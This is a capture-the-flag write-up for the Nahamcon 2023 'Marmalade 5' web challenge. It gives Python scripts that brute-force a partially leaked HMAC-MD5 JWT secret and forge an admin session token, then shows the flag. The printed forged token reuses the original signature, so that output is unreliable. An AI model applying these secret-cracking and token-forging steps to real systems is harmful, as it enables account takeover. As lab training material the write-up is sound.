---
name: Marmalade 5 (2023)
event: Nahamcon CTF 2023
category: Web
description: Writeup for Marmalade 5 (Web) - Nahamcon CTF (2023) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Marmalade 5

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/3LRZsnSyDrQ/0.jpg)](https://www.youtube.com/watch?v=3LRZsnSyDrQ "Nahamcon CTF 2023: Marmalade 5 (Web)")

## Description

> Enjoy some of our delicious home made marmalade!

## Recon

Can't register as `admin`.

{% code overflow="wrap" %}
```bash
Login as the admin has been disabled
```
{% endcode %}

Register as `cat` and it says only `admin` can get flag!

Check the [JWT](https://youtu.be/GIq3naOLrTg) in session cookies.

{% code overflow="wrap" %}
```json
eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImNhdCJ9.C3Z8QcoVXXFa-LAzFZbZ1w
```
{% endcode %}

Decode it with [jwt.io](https://jwt.io)

{% code overflow="wrap" %}
```json
{
  "alg": "MD5_HMAC"
}
{
  "username": "cat"
}
```
{% endcode %}

## First attempts

Tried `null` and `none` algorithm attacks with `jwt_tool`.

{% code overflow="wrap" %}
```bash
jwt_tool eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImNhdCJ9.C3Z8QcoVXXFa-LAzFZbZ1w -X a -pc username -pv admin
```
{% endcode %}

When trying to use the tokens, get an error.

{% code overflow="wrap" %}
```bash
Invalid algorithm, we only accept tokens signed with our MD5_HMAC algorithm using the secret fsrwjcfszeg*****
```
{% endcode %}

So we know the first 11 characters of the key `fsrwjcfszeg`, let's try to brute force the last 5.

Tried `jwt_tool` but it doesn't work with the `MD5_HMAC` algorithm.

{% code overflow="wrap" %}
```bash
jwt_tool eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImNhdCJ9.C3Z8QcoVXXFa-LAzFZbZ1w -C -p fsrwjcfszeg*****

Algorithm is not HMAC-SHA - cannot test with this tool.
```
{% endcode %}

Same goes for `hashcat`.

{% code overflow="wrap" %}
```bash
hashcat -a 3 -m 16500 'eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImNhdCJ9.C3Z8QcoVXXFa-LAzFZbZ1w' fsrwjcfszeg?l?l?l?l?l

Hash 'eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImNhdCJ9.C3Z8QcoVXXFa-LAzFZbZ1w': Token length exception
No hashes loaded.
```
{% endcode %}

## Solve script #1 (brute-force)

Let's (me and chatGPT) make a custom script to crack the signature.

{% code overflow="wrap" %}
```python
import jwt
import hashlib
import hmac
import base64

jwt_token = "eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImNhdCJ9.C3Z8QcoVXXFa-LAzFZbZ1w"

def verify_jwt(jwt_token, key):
    # Split the JWT into header, payload, and signature
    header, payload, signature = jwt_token.split('.')

    # Recreate the signing input by concatenating the header and payload with a dot
    signing_input = header + '.' + payload

    # Convert the signing input and key to bytes
    signing_input_bytes = signing_input.encode('utf-8')
    key_bytes = key.encode('utf-8')

    # Create an HMAC-MD5 hash object
    hash_obj = hmac.new(key_bytes, signing_input_bytes, hashlib.md5)

    # Get the HMAC-MD5 signature
    calculated_signature = hash_obj.hexdigest()

    # Decode the Base64-encoded signature from the JWT
    decoded_signature = base64.urlsafe_b64decode(signature + "==")

    # Compare the decoded signature with the calculated signature
    if decoded_signature == bytes.fromhex(calculated_signature):
        print("Key:", key)
        exit(0)

# Define the character set and key length
charset = "abcdefghijklmnopqrstuvwxyz"
key_length = 5

# Loop through different keys
for i in range(len(charset) ** key_length):
    key = ""
    for j in range(key_length):
        key = charset[i % len(charset)] + key
        i //= len(charset)

    verify_jwt(jwt_token, 'fsrwjcfszeg' + key)
```
{% endcode %}

Got the key!

{% code overflow="wrap" %}
```bash
Key: fsrwjcfszegvsyfa
```
{% endcode %}

## Solve script #2 (forge token)

Now another custom script to forge a token with user `admin`.

{% code overflow="wrap" %}
```python
import jwt
import hashlib
import hmac
import base64

jwt_token = "eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImNhdCJ9.C3Z8QcoVXXFa-LAzFZbZ1w"
key = "fsrwjcfszegvsyfa"

# Split the JWT into header, payload, and signature
header, payload, signature = jwt_token.split('.')

# Decode the payload from the token
decoded_payload = base64.urlsafe_b64decode(payload + "==").decode('utf-8')

# Modify the payload
modified_payload = decoded_payload.replace('"username":"cat"', '"username":"admin"')

# Encode the modified payload
encoded_payload = base64.urlsafe_b64encode(modified_payload.encode('utf-8')).decode('utf-8').rstrip('=')

# Recreate the signing input by concatenating the header and modified payload with a dot
signing_input = header + '.' + encoded_payload

# Convert the signing input and key to bytes
signing_input_bytes = signing_input.encode('utf-8')
key_bytes = key.encode('utf-8')

# Create an HMAC-MD5 hash object
hash_obj = hmac.new(key_bytes, signing_input_bytes, hashlib.md5)

# Get the HMAC-MD5 signature
calculated_signature = hash_obj.digest()

# Encode the calculated signature using base64
encoded_signature = base64.urlsafe_b64encode(calculated_signature).rstrip(b'=').decode('utf-8')

# Replace the characters '+' and '/' in the encoded signature with '-' and '_'
encoded_signature = encoded_signature.replace('+', '-').replace('/', '_')

# Create the modified JWT by concatenating the modified header, encoded payload, and encoded signature
modified_jwt = header + '.' + encoded_payload + '.' + encoded_signature

print("Modified Token:", modified_jwt)
```
{% endcode %}

Receive a new token, signed with `MD5_HMAC` using the secret key `fsrwjcfszegvsyfa`.

{% code overflow="wrap" %}
```bash
eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.C3Z8QcoVXXFa-LAzFZbZ1w
```
{% endcode %}

We replace the cookie and receive a flag!

Flag: `flag{a249dff54655158c25ddd3584e295c3b}`
